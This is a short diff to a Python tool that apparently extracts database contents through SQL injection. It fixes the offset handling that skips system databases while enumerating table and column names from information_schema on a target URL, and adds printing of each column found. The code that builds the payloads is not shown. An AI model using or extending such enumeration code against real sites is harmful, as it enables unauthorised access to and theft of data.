@@ -48,6 +48,9 @@ def get_tables_names(target_url):
         table_name = retrieve_data(make_payload(target_url, 'table_name', 'information_schema.tables', offset))
         if db_name and table_name:
             if db_name != '[ERROR]' and table_name != '[ERROR]':
+                if isIgnorable(db_name):
+                    offset += 1
+                    continue
                 tbl_names.append(db_name + '.' + table_name)
             else:
                 break
@@ -72,13 +75,14 @@ def get_columns_names(target_url):
             break
         # Skip system databases
         if isIgnorable(db_name):
+            offset += 1
             continue
 
         column.database = db_name + '.' + table_name
         column.name = retrieve_data(make_payload(target_url, 'column_name', 'information_schema.columns', offset))
         col_names.append(column)
+        print('Name: ' + column.database + ' => ' + column.name)
         offset += 1
-
 
 def get_columns_data(target_url):
     global col_names
